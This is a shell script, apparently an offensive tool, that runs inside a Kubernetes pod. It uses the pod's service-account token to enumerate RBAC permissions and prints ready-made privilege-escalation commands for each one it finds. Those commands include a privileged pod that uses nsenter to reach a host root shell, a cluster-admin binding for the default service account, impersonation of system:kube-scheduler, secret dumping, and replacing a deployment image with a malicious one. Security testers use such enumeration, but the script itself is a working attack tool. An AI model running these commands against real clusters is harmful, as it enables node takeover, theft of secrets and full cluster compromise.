#!/bin/sh
#
# kube-privesc-enum.sh (..Overhauled..)
#
# A script to actively enumerate Kubernetes RBAC permissions for privilege escalation vectors.
# It dynamically discovers API resources, checks for both namespaced and cluster-level
# permissions, and provides actionable commands for high-impact findings.
#

# --- Configuration ---
# Colors for better output visibility
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[0;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

# High-impact verbs to check for privilege escalation
PRIVESC_VERBS="get list watch create update patch delete impersonate bind escalate exec"
STANDARD_VERBS="get list watch create update patch delete"

# --- Setup ---
# Ensure we are inside a pod
if [ ! -f /var/run/secrets/kubernetes.io/serviceaccount/token ]; then
    echo "${RED}ERROR: This script must be run from within a Kubernetes pod.${NC}"
    exit 1
fi

TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
API_SERVER="https://${KUBERNETES_SERVICE_HOST}:${KUBERNETES_SERVICE_PORT}"
NAMESPACE=$(cat /var/run/secrets/kubernetes.io/serviceaccount/namespace)

# --- Helper Functions ---

# Function to display usage information
usage() {
    echo "Usage: $0 [-n <namespace>] [-A]"
    echo "  -n <namespace>  Specify a namespace to check (default: current namespace '$NAMESPACE')."
    echo "  -A              Check permissions across ALL namespaces."
    exit 1
}

# Function to dynamically discover all API resources in the cluster
discover_api_resources() {
    echo "[*] Discovering API resources..."
    # Core API resources (v1)
    CORE_RESOURCES=$(curl -sk -H "Authorization: Bearer $TOKEN" "$API_SERVER/api/v1" | \
        grep -o '"name": "[^"]*"' | cut -d'"' -f4 | tr '\n' ' ')

    # Namespaced API group resources
    API_GROUPS=$(curl -sk -H "Authorization: Bearer $TOKEN" "$API_SERVER/apis" | \
        grep -o '"groupVersion": "[^"]*"' | cut -d'"' -f4)

    GROUP_RESOURCES=""
    for group in $API_GROUPS; do
        GROUP_RESOURCES="$GROUP_RESOURCES $(curl -sk -H "Authorization: Bearer $TOKEN" "$API_SERVER/apis/$group" | \
            grep -o '"name": "[^"]*"' | cut -d'"' -f4 | tr '\n' ' ')"
    done
    
    ALL_RESOURCES=$(echo "$CORE_RESOURCES $GROUP_RESOURCES" | tr ' ' '\n' | sort -u | tr '\n' ' ')
    echo "${GREEN}[+] Discovered $(echo "$ALL_RESOURCES" | wc -w) unique resource types.${NC}"
    echo "$ALL_RESOURCES"
}

# Function to perform a SelfSubjectAccessReview
# Args: $1=namespace, $2=verb, $3=resource
check_permission() {
    local ns="$1"
    local verb="$2"
    local resource="$3"
    
    # The payload is slightly different for cluster-scoped checks (namespace is empty)
    if [ -z "$ns" ]; then
        scope_desc="cluster-wide"
        payload="{\"kind\":\"SelfSubjectAccessReview\",\"apiVersion\":\"authorization.k8s.io/v1\",\"spec\":{\"resourceAttributes\":{\"verb\":\"$verb\",\"resource\":\"$resource\"}}}"
    else
        scope_desc="in namespace '$ns'"
        payload="{\"kind\":\"SelfSubjectAccessReview\",\"apiVersion\":\"authorization.k8s.io/v1\",\"spec\":{\"resourceAttributes\":{\"namespace\":\"$ns\",\"verb\":\"$verb\",\"resource\":\"$resource\"}}}"
    fi

    response=$(curl -sk -X POST "$API_SERVER/apis/authorization.k8s.io/v1/selfsubjectaccessreviews" \
        -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" -d "$payload")

    if echo "$response" | grep -q '"allowed":true'; then
        echo "  ${GREEN}[ALLOWED]${NC} Can ${verb} ${resource} ${scope_desc}"
        analyze_and_suggest "$ns" "$verb" "$resource"
    fi
}

# Function to analyze allowed permissions and suggest privesc commands
# Args: $1=namespace, $2=verb, $3=resource
analyze_and_suggest() {
    local ns="$1"
    local verb="$2"
    local resource="$3"

    # Use the namespace of the check, or the pod's own namespace if cluster-scoped
    local target_ns=${ns:-$NAMESPACE}

    case "$verb/$resource" in
        "get/secrets")
            echo "    ${YELLOW}[PRIVESC] Found permission to read secrets. Try:${NC}"
            echo "    ${BLUE}kubectl get secrets -n ${target_ns} -o yaml${NC}"
            ;;
        "create/pods")
            echo "    ${RED}[PRIVESC] Found permission to create pods. Try spawning a privileged pod on a node:${NC}"
            echo "    ${BLUE}kubectl run --rm -i --tty priv-pod -n ${target_ns} --image=alpine --overrides='{\"spec\":{\"hostPID\":true,\"containers\":[{\"name\":\"1\",\"image\":\"alpine\",\"command\":[\"nsenter\",\"--target\",\"1\",\"--mount\",\"--uts\",\"--ipc\",\"--net\",\"--pid\",\"--\",\"/bin/sh\"],\"stdin\":true,\"tty\":true,\"securityContext\":{\"privileged\":true}}]}}'${NC}"
            ;;
        "create/pods/exec")
            echo "    ${RED}[PRIVESC] Found permission to exec into pods. Try to get a shell in a privileged pod:${NC}"
            echo "    ${BLUE}kubectl exec -n <namespace> -it <pod-name> -- /bin/sh${NC}"
            ;;
        "impersonate/users"|"impersonate/groups"|"impersonate/serviceaccounts")
            echo "    ${RED}[PRIVESC] Found permission to impersonate. Try acting as a privileged user:${NC}"
            echo "    ${BLUE}kubectl get pods --as=system:kube-scheduler${NC}"
            ;;
        "create/clusterrolebindings")
            echo "    ${RED}[PRIVESC] Found permission to create ClusterRoleBindings. You can grant yourself cluster-admin:${NC}"
            echo "    ${BLUE}kubectl create clusterrolebinding dirty-binding --clusterrole=cluster-admin --serviceaccount=${NAMESPACE}:default${NC}"
            ;;
        "update/deployments")
            echo "    ${YELLOW}[PRIVESC] Found permission to update deployments. You can change the image to a malicious one:${NC}"
            echo "    ${BLUE}kubectl set image deployment/<deployment-name> -n ${target_ns} <container-name>=<your-malicious-image>${NC}"
            ;;
    esac
}

# --- Main Execution ---

# Default to current namespace
target_namespace=$NAMESPACE
check_all_ns=false

# Parse command-line options
while getopts "n:Ah" opt; do
  case ${opt} in
    n) target_namespace=$OPTARG ;;
    A) check_all_ns=true ;;
    h) usage ;;
    \?) echo "Invalid option: -$OPTARG" >&2; usage ;;
  esac
done

echo "=================================================="
echo " K8s Privilege Escalation Enumeration Script"
echo "=================================================="
echo "[*] API Server: $API_SERVER"
echo "[*] Current Namespace: $NAMESPACE"
echo "--------------------------------------------------"

# Discover resources first
RESOURCES_TO_CHECK=$(discover_api_resources)

# --- Perform Checks ---

echo "\n[*] === Checking Cluster-Level Permissions === [*]"
for resource in $RESOURCES_TO_CHECK; do
    for verb in $PRIVESC_VERBS; do
        check_permission "" "$verb" "$resource"
    done
done

if [ "$check_all_ns" = true ]; then
    echo "\n[*] === Checking Permissions in ALL Namespaces === [*]"
    ALL_NAMESPACES=$(curl -sk -H "Authorization: Bearer $TOKEN" "$API_SERVER/api/v1/namespaces" | grep -o '"name": "[^"]*"' | cut -d'"' -f4)
    for ns in $ALL_NAMESPACES; do
        echo "\n--- Namespace: $ns ---"
        for resource in $RESOURCES_TO_CHECK; do
            for verb in $STANDARD_VERBS; do
                check_permission "$ns" "$verb" "$resource"
            done
        done
    done
else
    echo "\n[*] === Checking Permissions in Namespace: $target_namespace === [*]"
    for resource in $RESOURCES_TO_CHECK; do
        for verb in $STANDARD_VERBS; do
            check_permission "$target_namespace" "$verb" "$resource"
        done
    done
fi

echo "\n--------------------------------------------------"
echo "${GREEN}Permission enumeration complete.${NC}"
echo "Review the output above for ${YELLOW}[PRIVESC]${NC} tags and suggested commands."
echo "=================================================="
